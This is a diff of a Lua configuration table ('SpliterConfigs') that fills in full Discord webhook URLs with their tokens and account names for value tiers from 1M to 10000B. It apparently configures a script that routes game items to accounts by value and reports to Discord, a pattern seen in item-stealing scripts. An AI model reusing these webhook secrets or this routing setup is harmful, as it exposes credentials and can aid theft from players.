@@ -1,27 +1,27 @@
 _G.SpliterConfigs = {
     SPLIT_ITEM = {
-        WEBHOOK_LINK = "",
-        USER_ACCOUNT = "1"
+        WEBHOOK_LINK = "https://discord.com/api/webhooks/1307955690115174412/aVtvnSr7OG0EeEHkHIF6JDaARZt0hBBLyFDssd1N49HV7p_RqQrT01tm9rR6hg74jjPg",
+        USER_ACCOUNT = "yfyqmxj_769628"
     },
 
     SPLIT_1M_20M = {
-        WEBHOOK_LINK = "",
-        USER_ACCOUNT = "b"
+        WEBHOOK_LINK = "https://discord.com/api/webhooks/1307955850912202773/Djx5sFXFzJLCvh0SzptOokP7tNUttxuTrTFJnbhZmqlsI3ZlcV53Z4iKXtUhcTwoKxul",
+        USER_ACCOUNT = "jzvrurg_152179"
     },
 
     SPLIT_20M_50M = {
-        WEBHOOK_LINK = "",
-        USER_ACCOUNT = "c"
+        WEBHOOK_LINK = "https://discord.com/api/webhooks/1307955975348817991/5P9apewBcQA4VafVZoJAlRdXSqWZUUbtON95V628UHvHEczK5koSOqqt7I6JR5Xbpvkj",
+        USER_ACCOUNT = "pwckmmb_s53423"
     },
 
     SPLIT_50M_100M = {
-        WEBHOOK_LINK = "",
-        USER_ACCOUNT = "d"
+        WEBHOOK_LINK = "https://discord.com/api/webhooks/1307956043439145002/eMhJ-RZM4LTHAng3x-w4zJFRLpDCwOYWRt317s_RHW59_BA6DU_031EV7866SC9PKLNR",
+        USER_ACCOUNT = "yhmrkcw_e35970"
     },
 
     SPLIT_100M_10000B = {
-        WEBHOOK_LINK = "",
-        USER_ACCOUNT = "e"
+        WEBHOOK_LINK = "https://discord.com/api/webhooks/1307956126796484640/RWJzUvUfJwW44T27OxJMHOTuicXjKGMAkq0_cIT_GRPbf6D9OVpJi7E6m8_APbbkvAgM",
+        USER_ACCOUNT = "eyhrpjo_332920"
     },
 }
 
